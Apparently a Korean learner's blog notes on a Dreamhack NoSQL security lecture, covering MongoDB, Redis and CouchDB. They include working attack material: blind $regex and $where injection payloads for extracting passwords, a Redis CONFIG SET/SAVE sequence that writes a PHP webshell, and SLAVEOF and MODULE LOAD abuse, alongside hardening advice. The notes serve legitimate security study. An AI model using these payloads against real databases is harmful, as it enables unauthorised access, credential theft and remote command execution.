---
title: "[모각코] #5 드림핵 6강 Server-side Advanced - NoSQL"
categories:
  - Hacking
  - MGK
tags:
  - Hacking
  - MGK
toc: true
toc_sticky: true
---

# NoSQL

* NoSQL: SQL을 사용해 데이터를 조회/추가/삭제하는 관계형 데이터베이스(RDBMS)와 달리 SQL을 사용하지 않으며, 이에 따라 RDBMS와는 달리 **복잡하지 않은 데이터**를 다루는 것이 큰 특징이자 RDBMS와의 차이점



## MongoDB

* **특징:**

  * key-value의 쌍을 가지는 JSON objects 형태인 도큐먼트를 저장

  * Schema가 존재하지 않아 각 테이블(MongoDB에선 Collection)에 대한 특별한 정의를 하지 않아도 됩니다.

  * JSON 형식으로 쿼리를 작성

  * _id필드가 Primary Key 역할

    

  ※ **Query Operator**

  **Comparison**

  | Name   | Description                                                  |
  | ------ | ------------------------------------------------------------ |
  | `$eq`  | 지정된 값과 같은 값을 찾습니다. **(equal)**                  |
  | `$gt`  | 지정된 값보다 큰 값을 찾습니다. **(greater than)**           |
  | `$gte` | 지정된 값보다 크거나 같은 값을 찾습니다. **(greater than equal)** |
  | `$in`  | 배열 안의 값들과 일치하는 값을 찾습니다. **(in)**            |
  | `$lt`  | 지정된 값보다 작은 값을 찾습니다. **(less than)**            |
  | `$lte` | 지정된 값보다 작거나 같은 값을 찾습니다. **(less than equal)** |
  | `$ne`  | 지정된 값과 같지 않은 값을 찾습니다. **(not equal)**         |
  | `$nin` | 배열 안의 값들과 일치하지 않는 값을 찾습니다. **(not in)**   |

  ------

  **Logical**

  | Name   | Description                                                  |
  | ------ | ------------------------------------------------------------ |
  | `$and` | 논리적 AND, 각각의 쿼리를 모두 만족하는 문서가 반환됩니다.   |
  | `$not` | 쿼리 식의 효과를 반전시킵니다. 쿼리 식과 일치하지 않는 문서를 반환합니다. |
  | `$nor` | 논리적 NOR, 각각의 쿼리를 모두 만족하지 않는 문서가 반환됩니다. |
  | `$or`  | 논리적 OR, 각각의 쿼리 중 하나 이상 만족하는 문서가 반환됩니다. |

  ------

  **Element**

  | Name      | Description                                    |
  | --------- | ---------------------------------------------- |
  | `$exists` | 지정된 필드가 있는 문서를 찾습니다.            |
  | `$type`   | 지정된 필드가 지정된 유형인 문서를 선택합니다. |

  ------

  **Evaluation**

  | Name          | Description                                                  |
  | ------------- | ------------------------------------------------------------ |
  | `$expr`       | 쿼리 언어 내에서 집계 식을 사용할 수 있습니다.               |
  | `$jsonSchema` | 주어진 JSON 스키마에 대해 문서를 검증합니다.                 |
  | `$mod`        | 필드 값에 대해 mod 연산을 수행하고 지정된 결과를 가진 문서를 선택합니다. |
  | `$regex`      | 지정된 정규식과 일치하는 문서를 선택합니다.                  |
  | `$text`       | 지정된 텍스트를 검색합니다.                                  |
  | `$where`      | 지정된 JavaScript 식을 만족하는 문서와 일치합니다.           |



### **Bug case**

*  **MongoDB Injection**:

  -> 주로 사용자 입력 데이터에 대한 타입 검증이 충분하지 않아 발생

  -> 오브젝트 타입의 입력 데이터로 처리 시 쿼리 연산자등을 사용할 수 있으며, 이를 통해 의도하지 않은 행위 수행 가능

ex) 

```js
const express = require('express');
const app = express();
app.use(express.json());
app.use(express.urlencoded( {extended : false } ));
const mongoose = require('mongoose');
const db = mongoose.connection;
mongoose.connect('mongodb://localhost:27017/', { useNewUrlParser: true, useUnifiedTopology: true });
app.post('/query', function(req,res) {
    db.collection('user').find({
        'uid': req.body.uid,
        'upw': req.body.upw
    }).toArray(function(err, result) {
        if (err) throw err;
        res.send(result);
  });
});
const server = app.listen(80, function(){
    console.log('app.listen');
});
```

=> **Line 11~14** : 쿼리의 내용이 `{'uid': input, 'upw': input}` 으로 구성

=> ![image-20210721212406522](C:\Users\yttn0\AppData\Roaming\Typora\typora-user-images\image-20210721212406522.png)

### Blind Injection

​	: **데이터베이스 조회 후 결과를 직접적으로 확인할 수 없는 경우 사용될 수 있는 공격 기법**

 * **원리:**

   DBMS의 함수 또는 연산 과정 등을 이용해 **데이터베이스 내에 존재하는 데이터와 사용자 입력을 비교**하며, 특정한 조건 발생 시 **특별한 응답을 발생**시켜 해당 비교에 대한 검증을 수행

- ### **$regex**

  **정규식**을 사용해 한글자 씩 비교하면서 Blind SQL Injection

  ```js
  > db.user.find({upw: {$regex: "^a"}})
  > db.user.find({upw: {$regex: "^b"}})
  > db.user.find({upw: {$regex: "^c"}})
  ...
  > db.user.find({upw: {$regex: "^g"}})
  { "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
  ```

  

  ### **$where**

  **-> field 안에서 사용할 수 없음**

  `$where` 연산자를 사용할 수 있거나, `$where`연산자의 데이터로 입력 값을 추가할 수 있다면 아래와 같이 데이터를 추출 가능

  ```js
  > db.user.find({$where: "this.upw.substring(0,1)=='a'"})
  > db.user.find({$where: "this.upw.substring(0,1)=='b'"})
  > db.user.find({$where: "this.upw.substring(0,1)=='c'"})
  ...
  > db.user.find({$where: "this.upw.substring(0,1)=='g'"})
  { "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
  ```

  - `$where` Time Based

  MongoDB의 **sleep함수**를 통해 시간 지연을 발생시킬 수 있습니다.

  ```js
  db.user.find({$where: `this.uid=='${req.query.uid}'&&this.upw=='${req.query.upw}'`});
  /*
  /?uid=guest'&&this.upw.substring(0,1)=='a'&&sleep(5000)&&'1
  /?uid=guest'&&this.upw.substring(0,1)=='b'&&sleep(5000)&&'1
  /?uid=guest'&&this.upw.substring(0,1)=='c'&&sleep(5000)&&'1
  ...
  /?uid=guest'&&this.upw.substring(0,1)=='g'&&sleep(5000)&&'1
  => 시간 지연 발생.
  ```

  - `$where` Error Based

  ```js
  > db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='g'&&asdf&&'1'&&this.upw=='${upw}'"});
  error: {
  	"$err" : "ReferenceError: asdf is not defined near '&&this.upw=='${upw}'' ",
  	"code" : 16722
  }
  // this.upw.substring(0,1)=='g' 값이 참이기 때문에 asdf 코드를 실행하다 에러 발생
  > db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='a'&&asdf&&'1'&&this.upw=='${upw}'"});
  // this.upw.substring(0,1)=='a' 값이 거짓이기 때문에 뒤에 코드가 작동하지 않음
  ```

  

## Redis

​	**-> key-value 데이터 모델을 가지며 메모리 기반으로 작동하는 NoSQL DBMS**

​	=> 다양한 서비스에서 임시 데이터를 캐싱하는 용도로 많이 사용

* **명령어 리스트**

  * **데이터 관련**

    | 명령어     | 구조                           | 설명               |
    | ---------- | ------------------------------ | ------------------ |
    | **GET**    | GET key                        | 데이터 조회        |
    | **MGET**   | MGET key [key ...]             | 여러 데이터를 조회 |
    | **SET**    | SET key value                  | 새로운 데이터 추가 |
    | **MSET**   | MSET key value [key value ...] | 여러 데이터를 추가 |
    | **DEL**    | DEL key [key ...]              | 데이터 삭제        |
    | **EXISTS** | EXISTS key [key ...]           | 데이터 유무 확인   |
    | **INCR**   | INCR key                       | 데이터 값에 1 더함 |
    | **DECR**   | DECR key                       | 데이터 값에 1 뺌   |

  * **관리 명령어**

    | 명령어         | 구조                       | 설명               |
    | -------------- | -------------------------- | ------------------ |
    | **INFO**       | INFO [section]             | DBMS 정보 조회     |
    | **CONFIG GET** | CONFIG GET parameter       | 설정 조회          |
    | **CONFIG SET** | CONFIG SET parameter value | 새로운 설정을 입력 |



### Bug Case

* **node-Redis 모듈**

  ```js
  var express = require('express');
  var app = express();
  app.use(express.json());
  app.use(express.urlencoded( {extended : false } ));
  const redis = require("redis");
  const client = redis.createClient();
  app.get('/init', function(req,res) {
      // client.set("key", "value");
      client.set(req.query.uid, JSON.stringify({level: 'guest'})); //redis에 사용자가 입력하는 uid 값을 key로 {level: 'geust'} 값을 value로 저장
      res.send('ok')
  });
  var server = app.listen(3000, function(){
      console.log('app.listen');
  });
  ```

  **※ 개발 시 의도된 value로 값이 설정되지 않고 임의의 값을 value를 사용가능**

  ex) 

  > `http://localhost:3000/init?uid[]=test&uid[]={"level":"admin"}`와 같이 array 타입 입력 시, 실제로 Redis에 요청하는 명령어는 `Command("set", "test", '{"level":"admin"}')`와 같은 명령어가 실행되어 원하는 Value를 가진 데이터를 생성



- **SSRF (Server-Side Request Forgery)**

  -> Redis는 기본적으로 인증 체계가 존재X , bind 127.0.0.1로 서비스

   **=>  직접 접근하여 인증 과정없이 명령어를 실행 가능**

  

  * **공격방식**

    * 원리 : 

      1. Redis에서는 이전 명령어가 유효하지 않은 명령어가 입력되어도 **연결이 끊어지지 않고 다음 유효한 명령어를 처리**

         **ex)** 

         ```pseudocode
         $ echo -e "anydata: anydata\r\nget hello" | nc 127.0.0.1 6379
         -ERR unknown command 'anydata:'
         $5
         world
         ```

         -> 두번째 명령 수행됨

         

      2. **HTTP 프로토콜을 이용한 공격** 

         ex) 

         ```pseudocode
         POST / HTTP/1.1
         host: 127.0.0.1:6379
         user-agent: Mozilla/5.0...
         content-type: application/x-www-form-urlencoded
         data=a
         SET key value
         ...
         ```

         -> HTTP의 Body부분에 원하는 명령어를 포함시켜 공격

      

  * **방어방법**

    -> HTTP의 주요 키워드가 명령어로 입력되면 해당 연결을 끊어버리는 방식

    ```pseudocode
    $ echo -e "post a\r\nget hello" | nc 127.0.0.1 6379
    $ echo -e "host: a\r\nget hello" | nc 127.0.0.1 6379
    # 12235:M 01 May 09:59:57.614 # Possible SECURITY ATTACK detected. It looks like somebody is sending POST or Host: commands to Redis. This is likely due to an attacker attempting to use Cross Protocol Scripting to compromise your Redis instance. Connection aborted.
    ```

    -> `post` 또는 `host` 키워드가 포함될 경우 securityWarningCommand로 인식하여 클라이언트와의 연결을 끊기

    

### **Exploit Technique**

* **공격 방법**

  * **다른 어플리케이션과 연계**

    * **django-redis-cache**

      -> Django 에서 Redis를 사용한 cache를 구현할 수 있는 모듈

      **=>  serialize를 할 때 Python의 pickle 모듈을 사용할 경우 공격에 사용**

      

  * **Redis 명령어**

    * **SAVE**

      -> 해당 파일을 저장하는 주기를 변경 또는 즉시 저장

       -> 저장되는 파일의 경로, 파일 이름 및 저장될 데이터 설정

      ```pseudocode
      CONFIG set dir /tmp # 저장될 파일 경로 설정 
      CONFIG set dbfilename redis.php # 파일 이름 설정
      SET test "<?php system($_GET['cmd']); ?>" # 데이터 추가
      SAVE # 파일 시스템 저장
      ```

      

    * **SLAVEOF / REPLICAOF**

      -> 다른 Redis 노드를 명령어를 실행하는 노드의 마스터 노드로 지정

      -> 마스터 노드와 성공적으로 연결이 완료되면, 마스터 노드의 데이터를 복제하여 저장

      **=> 마스터 노드에 연결을 맺는 과정에서 발생하는 네트워크 트래픽을 통해 Redis 공격이 성공적으로 수행되었다는 점을 원격으로 확인 가능**

      ```pseudocode
      SLAVEOF 127.0.0.1 8888
      ```

    

    * **MODULE LOAD**

      -> RedisModuleSDK(https://github.com/RedisLabs/RedisModulesSDK)를 기반으로 공유 라이브러리를 제작해 파일 업로드 또는 Sync과정을 조작하여 임의의 데이터를 업로드하는 등의 로직을 통해 해당 Redis 파일 시스템에 업로드한 후 MODULE LOAD를 통해 해당 라이브러리를 로드 가능

      **=> system 함수와 같이 OS명령어를 실행하는 함수 또는 원하는 파일 시스템에 접근 할 수 있는 함수등을 포함 시켜 공격에 사용**

      

### **Redis 주의 사항**

- **인증 체계**

  -> Redis는 기본 설정 상 인증 과정이 포함되어 있지 않은 어플리케이션임

  * Redis 설정 파일에 `requirepass`에 패스워드 지정

    ```pseudocode
    $ cat /etc/redis/redis.conf ... requirepass pass1234
    ```

    설정 이후 Redis 사용 시 `AUTH` 명령어를 통해 인증 과정을 거쳐야만 Redis 명령어를 사용 가능

    ```
    $ sudo service redis-server restart...$ redis-cli127.0.0.1:6379> keys *(error) NOAUTH Authentication required.127.0.0.1:6379> AUTH pass1234OK127.0.0.1:6379> keys *1) "foo"
    ```

- **bind**

  -> 구조적 문제 또는기능상의 구현을 위해 `0.0.0.0` 등 위험한 Bind 범위를 지정하여 서비스되는 경우가 있음

  ```pseudocode
  # 기본 설정
  BIND 127.0.0.1
  # 위험한 설정
  # BIND 127.0.0.1 # 주석 처리 시 모든 IP 접속을 허용합니다.
  BIND 0.0.0.0
  # 기능적으로 허용해야 하는 경우 권고 설정, 
  # IP 지정을 통해 해당 IP만 허용하며 허용하는 IP에 대한 주기적인 확인이 필요합니다.
  BIND 192.168.1.2 127.0.0.1
  ```

  

- **Same Key (Prefix 없는 Key 사용)**

  -> Redis는 **Key-Value로 저장되는 구조**이고 RDBMS의 Schema/table 또는 MongoDB의 Collection과 같이 시스템적으로 특**정한 영역으로 구분지어 저장되지 않음**

  **=> 키 중복 문제 등을 방지하기 위해 `object-type:id` 같은 형식으로 스키마를 사용하고 여러 필드를 사용할 경우 `.`, `-`문자로 구분하여 사용해야 함!**

  

## CouchDB

* **CouchDB**:

   key-value의 쌍인 구조로 JSON objects 형태인 도큐먼트를 저장

  ex) 

  ```pseudocode
  $ curl -X PUT http://{username}:{password}@localhost:5984/users/guest -d '{"upw":"guest"}'  # user database에 데이터 추가
  {"ok":true,"id":"guest","rev":"1-22a458e50cf189b17d50eeb295231896"}
  $ curl http://{username}:{password}@localhost:5984/users/guest # # user database에 데이터 추가
  {"_id":"guest","_rev":"1-22a458e50cf189b17d50eeb295231896","upw":"guest"}
  ```

  * JSON 내부의 특수필드로,  `_`(밑줄) 문자로 시작하는 필드중 속성 값으로 사용되는 필드

    - `_id` : 도큐먼트의 아이디, 처음에 설정하지 않으면 랜덤한 값으로 설정되고 Primary Key 역할

    - `_rev` : 문서의 버전 정보

      

* **특수 구성요소**

  **Server**

  - `/` : 인스턴스에 대한 메타 정보를 반환

  - `/_all_dbs` : 인스턴스의 databases 목록을 반환

  - `/_utils` : 관리자페이지(Fauxton administration interface)로 이동

    

  **Databases**

  - `/db` : 지정된 데이터베이스에 대한 정보를 반환

  - `/{db}/_all_docs` : 지정된 데이터베이스에 포함된 모든 도큐먼트를 반환

  - `/{db}/_find` : 지정된 데이터베이스에서 JSON 쿼리에 해당하는 모든 도큐먼트를 반환

    

### Bug Case

-> CouchDB에서는 주로 사용자 입력 데이터에 대한 **타입 검증이 충분하지 않거나** **특수 구성요소로 사용되어지는 값들에 대한 접근**으로 인해 취약점이 발생

* NodeJS

  -> **CouchDB**를 사용할 때 apache에서 개발한 **nano** 패키지를 주로 사용

  * `get` 함수

    -> 특수 구성요소(`_all_docs`, `_db` 등)에 접근할 수 있으며, 이를 통해 의도하지 않은 행위를 수행

  * `find` 함수

    -> 오브젝트 타입의 입력 데이터로 처리 시 연산자등을 사용할 수 있으며, 이를 통해 의도하지 않은 행위를 수행
